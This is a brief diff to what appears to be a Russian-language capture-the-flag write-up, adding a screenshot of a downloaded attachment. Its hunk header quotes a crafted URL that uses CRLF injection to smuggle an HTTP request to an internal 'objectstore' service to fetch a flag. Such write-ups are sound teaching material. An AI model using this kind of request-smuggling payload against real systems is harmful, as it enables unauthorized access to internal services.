@@ -75,6 +75,7 @@ http+post://objectstore:8082/FLAG%20HTTP/1.1%0d%0aHost:%20objectstore%0d%0a%0d%0
 
 Скачанное вложение содержит:
 
+<img width="1219" height="336" alt="image" src="https://github.com/user-attachments/assets/eeed9b44-88e7-44af-9264-3f89d63012c8" />
 
 
 ---
